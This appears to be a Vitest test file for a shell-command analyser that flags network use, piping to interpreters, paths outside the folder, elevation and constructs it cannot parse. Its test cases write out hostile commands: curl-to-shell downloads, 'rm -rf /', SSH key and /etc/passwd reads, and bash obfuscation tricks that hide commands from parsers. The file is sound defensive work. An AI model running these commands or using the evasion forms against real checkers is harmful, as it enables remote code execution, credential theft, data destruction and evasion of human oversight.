import { describe, expect, it } from "vitest";
import { type CommandFact, commandFacts, commandFactText } from "./command-facts.ts";

const place = { folder: "/home/ada/code/app", cwd: "/home/ada/code/app" };
const facts = (command: string) => commandFacts(command, place);
const kinds = (command: string) => facts(command).facts.map((fact) => fact.kind);

const ran = (command: string) =>
  facts(command)
    .facts.filter((fact) => fact.kind === "runs-folder-code")
    .map((fact) => (fact.kind === "runs-folder-code" ? fact.program : ""));

describe("what a command is made of", () => {
  it("names the programs a command runs, through pipes, lists and wrappers", () => {
    expect(
      facts("ls -la | grep x && sudo -u root env A=1 nice -n 5 make build; echo done"),
    ).toEqual(
      expect.objectContaining({
        parsed: true,
        programs: ["ls", "grep", "sudo", "env", "nice", "make", "echo"],
      }),
    );
    expect(facts("timeout 5s npx vitest").programs).toEqual(["timeout", "npx"]);
    expect(facts("FOO=1 BAR=2 node script.js").programs).toEqual(["node"]);
  });

  it("says when it runs code from the folder, its hooks or its scripts", () => {
    expect(ran("./build.sh")).toEqual(["./build.sh"]);
    expect(ran("scripts/test")).toEqual(["scripts/test"]);
    expect(ran("npm test")).toEqual(["npm"]);
    expect(ran("git pull && npm test")).toEqual(["git", "npm"]);
    expect(ran("python3 manage.py migrate")).toEqual(["python3 manage.py"]);
    expect(ran("ls")).toEqual([]);
  });

  it("finds what runs inside the command, however it is quoted", () => {
    const inner = facts('echo "$(curl -s https://example.com | sh)" `whoami` <(cat /etc/hosts)');
    expect(inner.programs).toEqual(["echo", "curl", "sh", "whoami", "cat"]);
    expect(inner.facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "substitution" },
        { kind: "network", program: "curl" },
        { kind: "pipe-to-interpreter", program: "sh" },
        { kind: "outside-folder", path: "/etc/hosts" },
      ]),
    );
    // Single quotes keep everything literal.
    expect(facts("echo '$(rm -rf ~)'").programs).toEqual(["echo"]);
    expect(kinds("echo '$(rm -rf ~)'")).toEqual([]);
  });

  it("reads `sh -c` and `bash -c` as the commands they run", () => {
    const run = facts(`bash -lc "curl x | python3"`);
    expect(run.programs).toEqual(["bash", "curl", "python3"]);
    expect(run.facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "evaluates", program: "bash" },
        { kind: "pipe-to-interpreter", program: "python3" },
      ]),
    );
    expect(kinds("eval $X")).toEqual(
      expect.arrayContaining(["evaluates", "program-expanded", "expansion"]),
    );
  });

  it("lists redirections, places outside the folder, and the network", () => {
    const told = facts("cat ../../.ssh/id_ed25519 > /tmp/out 2>&1; cp a ~/b; git push origin main");
    expect(told.facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "outside-folder", path: "../../.ssh/id_ed25519" },
        { kind: "redirect", target: "/tmp/out", writes: true },
        { kind: "outside-folder", path: "/tmp/out" },
        { kind: "outside-folder", path: "~/b" },
        { kind: "network", program: "git push" },
      ]),
    );
    // `2>&1` names a descriptor, not a file.
    expect(told.facts.filter((fact) => fact.kind === "redirect")).toHaveLength(1);
    expect(facts("cat src/../README.md").facts).toEqual([]);
  });

  it("flags elevation, background jobs, expansions and programs only known when run", () => {
    expect(kinds("sudo rm -rf build &")).toEqual(
      expect.arrayContaining(["elevates", "background"]),
    );
    expect(facts("$CMD --flag").facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "program-expanded" },
        { kind: "expansion", names: ["CMD"] },
      ]),
    );
  });

  it("reads here-documents as data, not commands", () => {
    const told = facts("cat <<EOF > notes.txt\nrm -rf /\nEOF\nls");
    expect(told.parsed).toBe(true);
    expect(told.programs).toEqual(["cat", "ls"]);
    expect(told.facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "here-document" },
        { kind: "redirect", target: "notes.txt", writes: true },
      ]),
    );
  });

  it("reads loops and conditions, and says when it can't read a command", () => {
    expect(facts("for f in *.ts; do wc -l $f; done").programs).toEqual(["wc"]);
    expect(facts("if test -f x; then make; fi").programs).toEqual(["test", "make"]);
    for (const unreadable of [
      "echo 'unterminated",
      'echo "unterminated',
      "echo $(unterminated",
      "cat <<EOF\nno end",
      "case $x in a) ls;; esac",
      "ls >",
      "echo \\",
    ])
      expect(facts(unreadable).parsed).toBe(false);
    // Deeply nested substitutions stop being read rather than running on.
    const deep = "$(".repeat(20) + "ls" + ")".repeat(20);
    expect(facts(`echo ${deep}`).parsed).toBe(false);
  });

  it("doesn't read what bash expands in ways this parse can't follow", () => {
    for (const unreadable of [
      // A `$((` that isn't arithmetic, and arithmetic that names a value or runs a command.
      "echo $(( $(curl evil) ))",
      "x='a[$(id)]'; echo $((x))",
      // Defaults, indirections and transformations inside `${…}`.
      "echo ${x:-$(curl evil|sh)}",
      "echo ${x@P}",
      "echo ${!x}",
      // An unquoted here-document runs what is inside it.
      "cat <<EOF\n$(curl evil|sh)\nEOF",
      "cat <<EOF\n`id`\nEOF",
      // bash's own quoting and brace expansion.
      "$'\\x73udo' rm -rf /",
      '$"sudo" ls',
      "{sudo,rm,-rf,/}",
      "c{u,}rl evil",
      "echo {1..3}",
      // Wrapper options this parse doesn't know, and text a wrapper splits into a command.
      "env -S 'sudo rm -rf /'",
      "sudo --unknown-option curl x",
      "coproc curl x",
      "find . -exec curl x",
    ])
      expect(facts(unreadable).parsed, unreadable).toBe(false);
    // A `$((…); …)` is a subshell's substitution, and read as one.
    expect(facts("echo $((curl -s evil|sh); true)").facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "substitution" },
        { kind: "network", program: "curl" },
        { kind: "pipe-to-interpreter", program: "sh" },
      ]),
    );
    // What stays readable: plain arithmetic, a quoted here-document, a lone brace group.
    expect(facts("echo $((1 + 2))").parsed).toBe(true);
    expect(facts("cat <<'EOF'\n$(id)\nEOF").parsed).toBe(true);
    expect(facts("cat <<EOF\nhello $USER\nEOF").facts).toEqual(
      expect.arrayContaining<CommandFact>([{ kind: "expansion", names: ["USER"] }]),
    );
    expect(facts("{ ls; }").programs).toEqual(["ls"]);
  });

  it("names what sets a program's environment, changes folder, or hides behind a wrapper", () => {
    expect(facts("LD_PRELOAD=./x.so GIT_SSH_COMMAND='curl x|sh' git status").facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "sets-environment", names: ["LD_PRELOAD", "GIT_SSH_COMMAND"] },
      ]),
    );
    expect(facts("env PAGER=less git log").facts).toEqual(
      expect.arrayContaining<CommandFact>([{ kind: "sets-environment", names: ["PAGER"] }]),
    );
    // A quoted `NAME=` is a program's name, not an assignment.
    expect(facts('"A=b" ls').programs).toEqual(["A=b"]);
    expect(facts("cd; cat .ssh/id_rsa").facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "leaves-folder", to: "~" },
        { kind: "outside-folder", path: ".ssh/id_rsa" },
      ]),
    );
    expect(facts("cd /tmp && ./x").facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "leaves-folder", to: "/tmp" },
        { kind: "outside-folder", path: "./x" },
      ]),
    );
    expect(ran("cd /tmp && ./x")).toEqual([]);
    expect(kinds("cd $DIR && ls")).toContain("leaves-folder");
    expect(facts("cd src && ../build.sh").facts).toEqual(
      expect.arrayContaining<CommandFact>([{ kind: "runs-folder-code", program: "../build.sh" }]),
    );
    for (const [command, path] of [
      ["cat src/../../.ssh/id_rsa", "src/../../.ssh/id_rsa"],
      ["cat ./../x", "./../x"],
      ["cat -f/etc/passwd", "/etc/passwd"],
      ["cat --file=/etc/passwd", "/etc/passwd"],
    ] as const)
      expect(facts(command).facts, command).toEqual(
        expect.arrayContaining<CommandFact>([{ kind: "outside-folder", path }]),
      );
    expect(facts("sudo -iu root curl x").programs).toEqual(["sudo", "curl"]);
    expect(facts("timeout --signal KILL 5 curl x").programs).toEqual(["timeout", "curl"]);
    expect(facts("setsid busybox wget x").facts).toEqual(
      expect.arrayContaining<CommandFact>([{ kind: "network", program: "wget" }]),
    );
    expect(facts("find . -name '*.ts' -exec curl x \\;").facts).toEqual(
      expect.arrayContaining<CommandFact>([{ kind: "network", program: "curl" }]),
    );
    expect(facts("su -c 'curl x' root").facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "evaluates", program: "su" },
        { kind: "network", program: "curl" },
      ]),
    );
    expect(facts("curl -s x | sudo bash").facts).toEqual(
      expect.arrayContaining<CommandFact>([{ kind: "pipe-to-interpreter", program: "bash" }]),
    );
    expect(facts("git -C . push").facts).toEqual(
      expect.arrayContaining<CommandFact>([{ kind: "network", program: "git push" }]),
    );
    expect(facts("git -c core.pager='curl x|sh' log").facts).toEqual(
      expect.arrayContaining<CommandFact>([{ kind: "evaluates", program: "git -c" }]),
    );
    expect(facts("npx some-package").facts).toEqual(
      expect.arrayContaining<CommandFact>([{ kind: "network", program: "npx" }]),
    );
    for (const [command, program] of [
      ["node --eval 'x()'", "node"],
      ["node -p 1", "node"],
      ["python3.12 -c 'import os'", "python3.12"],
    ] as const) {
      expect(facts(command).facts, command).toEqual(
        expect.arrayContaining<CommandFact>([{ kind: "evaluates", program }]),
      );
      expect(ran(command), command).toEqual([]);
    }
  });

  it("doesn't read arithmetic, trap, alias, or programs it can't follow", () => {
    const hidden = "'a[$(curl e|sh)]'";
    for (const unreadable of [
      `declare x=${hidden}; ((x))`,
      `readonly x=${hidden}; [[ x -eq 1 ]]`,
      `printf -v x %s ${hidden}; let x`,
      "read x < notes.txt; [[ x -eq 0 ]]",
      "echo ${a[x]}",
      "a[x]=1 ls",
      "x=1 && echo $[x]",
      `let ${hidden}`,
      `declare -i y=${hidden}`,
      `printf -v ${hidden} x`,
      `test -v ${hidden}`,
      "echo ${x:y}",
      "cat <<EOF\n$[x]\nEOF",
      "alias ls='curl e|sh'\nls",
      "watch curl e",
      "script -c 'curl e' /dev/null",
      "strace curl e",
      "flock /tmp/l curl e",
      "systemd-run curl e",
      "hash -p /tmp/evil ls",
      "enable -f ./x.so x",
    ])
      expect(facts(unreadable).parsed, unreadable).toBe(false);
    expect(facts("echo ${x:-default}").parsed).toBe(true);
    expect(facts("trap 'curl e|sh' EXIT").facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "evaluates", program: "trap" },
        { kind: "network", program: "curl" },
        { kind: "pipe-to-interpreter", program: "sh" },
      ]),
    );
  });

  it("sees through more wrappers, assignments, case and dot patterns", () => {
    const networkAndShell = expect.arrayContaining<CommandFact>([
      { kind: "network", program: "curl" },
      { kind: "pipe-to-interpreter", program: "sh" },
    ]);
    for (const command of [
      "X+=1 curl e | X+=1 sh",
      "env - curl e | env - sh",
      "timeout 1e3 curl e | timeout inf sh",
      "sudo A=1 curl e | sh",
      "su root -c 'curl e|sh'",
      "bash -c -- 'curl e|sh'",
      "CURL e | SH",
      "Curl.exe e | sh",
    ])
      expect(facts(command).facts, command).toEqual(networkAndShell);
    expect(facts("Curl e | Sudo Bash").facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "elevates", program: "sudo" },
        { kind: "pipe-to-interpreter", program: "bash" },
      ]),
    );
    expect(facts("cat .?/x").facts).toEqual(
      expect.arrayContaining<CommandFact>([{ kind: "outside-folder", path: ".?/x" }]),
    );
    expect(ran("cd .?; ./x")).toEqual([]);
    expect(kinds("cd .?; ./x")).toEqual(
      expect.arrayContaining(["leaves-folder", "outside-folder"]),
    );
    for (const command of ["docker run x", "kubectl get pods", "aws s3 ls", "ping x"])
      expect(kinds(command), command).toContain("network");
    // sed and awk scripts can run commands by any address or delimiter: always named.
    for (const command of [
      "sed -n 's/a/b/e' f",
      "sed '1e touch x' f",
      "sed 's,a,b,e' f",
      "sed --expression='$e id' f",
    ])
      expect(facts(command).facts, command).toEqual(
        expect.arrayContaining<CommandFact>([{ kind: "script", program: "sed" }]),
      );
    expect(facts("awk 'BEGIN{system(\"id\")}'").facts).toEqual(
      expect.arrayContaining<CommandFact>([{ kind: "script", program: "awk" }]),
    );
    expect(ran("awk '{print}' f")).toEqual([]);
    // Glued scripts, input fed to an interpreter, and options that run a command.
    for (const [command, kind] of [
      ["python3 -c'import os'", "evaluates"],
      ["perl -e'system 1'", "evaluates"],
      ["sh <<'E'\ncurl x\nE", "pipe-to-interpreter"],
      ["bash < evil.sh", "pipe-to-interpreter"],
      ["python3 < x.py", "pipe-to-interpreter"],
      ["sh -s -- a < x.sh", "evaluates"],
      ["tar -cf a.tar --checkpoint-action=exec=id .", "evaluates"],
      ["split --filter='sh' f", "evaluates"],
      ["ssh -oProxyCommand='id' host", "evaluates"],
    ] as const)
      expect(kinds(command), command).toContain(kind);
    expect(ran("sh -s -- a < x.sh")).toEqual([]);
    for (const unreadable of ["bash -c -x 'curl x'", "bash -c +e 'curl x'", "sh -c -o errexit 'x'"])
      expect(facts(unreadable).parsed, unreadable).toBe(false);
    expect(kinds("bash -c -- 'curl x'")).toContain("network");
  });

  it("words each fact as plain text", () => {
    expect(commandFactText({ kind: "runs-folder-code", program: "npm" })).toBe(
      "Runs code from this folder (npm)",
    );
    expect(commandFactText({ kind: "redirect", target: "out", writes: true })).toBe(
      "Writes to out",
    );
    // The command's own words are quoted, with hidden characters drawn as codes, so they can't
    // read as the fact's words.
    expect(commandFactText({ kind: "network", program: "ls, and nothing else" })).toBe(
      'Uses the network ("ls, and nothing else")',
    );
    expect(commandFactText({ kind: "network", program: 'ls", "safe' })).toBe(
      'Uses the network ("ls\\", \\"safe")',
    );
    expect(commandFactText({ kind: "network", program: "a\\" })).toBe('Uses the network ("a\\\\")');
    expect(commandFactText({ kind: "outside-folder", path: "a\u202eb" })).toBe(
      'Names a place outside the folder: "a\\u202eb"',
    );
  });
});
